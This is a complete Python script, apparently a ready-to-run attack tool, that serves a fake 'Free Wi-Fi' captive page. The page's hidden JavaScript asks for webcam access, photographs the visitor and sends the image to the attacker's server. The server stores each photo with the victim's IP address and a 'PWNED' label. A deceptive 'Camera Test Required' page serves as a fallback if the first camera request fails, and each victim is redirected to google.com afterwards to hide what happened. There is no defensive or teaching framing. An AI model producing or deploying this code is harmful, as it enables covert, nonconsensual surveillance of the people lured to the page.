#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import base64
import os
import threading
import ssl
from datetime import datetime

# === CONFIG ===
HTTP_PORT = 8080
HTTPS_PORT = 8443
CERT_FILE = "server.pem"
DIR = "APOCALYPSE"
os.makedirs(DIR, exist_ok=True)

# === AUTO-GENERATE SELF-SIGNED CERT ===
if not os.path.exists(CERT_FILE):
    print("Generating self-signed cert...")
    os.system(f"openssl req -new -x509 -days 365 -nodes -out {CERT_FILE} -keyout {CERT_FILE} -subj '/CN=localhost' 2>/dev/null")

# === BULLETPROOF JS PAYLOAD ===
PAYLOAD = '''<script>
(() => {
  const send = b64 => fetch(location.href, {method:'POST',body:'img='+b64,mode:'no-cors'})
    .finally(() => setTimeout(() => location='https://google.com', 800));

  const snap = stream => new Promise(res => {
    const v = document.createElement('video');
    v.srcObject = stream; v.muted = true; v.play();
    v.onloadedmetadata = () => setTimeout(() => {
      const c = document.createElement('canvas');
      c.width = v.videoWidth || 1280; c.height = v.videoHeight || 720;
      c.getContext('2d').drawImage(v, 0, 0);
      const b64 = c.toDataURL('image/jpeg', 0.75).split(',')[1];
      stream.getTracks().forEach(t => t.stop());
      res(b64);
    }, 1200);
  });

  const steal = async () => {
    try { const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}); send(await snap(s)); return; } catch(e) {}
    document.body.dispatchEvent(new Event('click'));
    try { const s = await navigator.mediaDevices.getUserMedia({video:true}); send(await snap(s)); return; } catch(e) {}
    setTimeout(() => {
      location = `data:text/html,
        <body style="background:#000;color:#0f0;text-align:center;padding:20%;font-family:monospace">
        <h2>Camera Test Required</h2>
        <p>Tap to allow camera...</p>
        <script>
          document.body.onclick = async () => {
            try {
              const s = await navigator.mediaDevices.getUserMedia({video:true});
              const v = document.createElement('video'); v.srcObject=s; v.play();
              v.onloadedmetadata = () => setTimeout(() => {
                const c = document.createElement('canvas');
                c.width=v.videoWidth; c.height=v.videoHeight;
                c.getContext('2d').drawImage(v,0,0);
                fetch('https://' + location.hostname + ':8443', {method:'POST',body:'img='+c.toDataURL('image/jpeg').split(',')[1]});
                setTimeout(() => location='https://google.com', 1000);
              }, 1200);
            } catch(e) { location='https://google.com'; }
          };
        </script>
      `;
    }, 2000);
  };

  setTimeout(steal, 800);
})();
</script>'''

# === HTML TEMPLATE ===
HTML_TEMPLATE = """<!DOCTYPE html>
<html><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Free Wi-Fi</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#000;color:#fff;font-family:sans-serif;text-align:center;padding:20%}
    .card{background:#111;padding:2.5rem;border-radius:20px;max-width:90%;margin:auto;
           border:3px solid #f00;box-shadow:0 0 40px #f003}
    h1{font-size:2rem;margin-bottom:0.5rem}
    p{margin:1.5rem 0;font-size:1.1rem}
    button{background:#e63946;color:#fff;border:none;padding:1.3rem;font-size:1.4rem;
            border-radius:15px;width:100%;font-weight:bold;margin-top:1rem}
    button:active{background:#c1121f;transform:scale(0.98)}
  </style>
</head><body>
  <div class="card">
    <h1>Free Wi-Fi</h1>
    <p>Tap below to connect</p>
    <button id="btn">Connect Now</button>
  </div>
  {payload}
  <script>
    document.getElementById('btn').onclick = () => {
      const b = document.getElementById('btn');
      b.innerText = 'Connecting...';
      b.disabled = true;
      document.body.dispatchEvent(new Event('click'));
    };
  </script>
</body></html>"""

class ApocalypseHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        html = HTML_TEMPLATE.replace("{payload}", PAYLOAD)
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode('utf-8', errors='ignore')
        img = urllib.parse.parse_qs(data).get('img', [''])[0]

        if img and len(img) > 5000:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            ip = self.client_address[0]
            path = f"{DIR}/PWNED_{ts}_{ip}.jpg"
            with open(path, "wb") as f:
                f.write(base64.b64decode(img))
            print(f"APOCALYPSE: {path}")
        else:
            print(f"[-] Empty from {self.client_address[0]}")

        self.send_response(303)
        self.send_header("Location", "https://google.com")
        self.end_headers()

# === MODERN SSL CONTEXT ===
def start_server(port, use_ssl=False):
    server = socketserver.TCPServer(("", port), ApocalypseHandler)
    if use_ssl:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=CERT_FILE)
        server.socket = context.wrap_socket(server.socket, server_side=True)
        print(f"HTTPS LIVE → https://YOUR_IP:{port}")
    else:
        print(f"HTTP LIVE → http://YOUR_IP:{port}")
    server.serve_forever()

# === LAUNCH ===
print("APOCALYPSE: FINAL BUILD")
print("   LOOT → ./APOCALYPSE/")

threading.Thread(target=start_server, args=(HTTP_PORT, False), daemon=True).start()
threading.Thread(target=start_server, args=(HTTPS_PORT, True), daemon=True).start()

import time
while True: time.sleep(1)
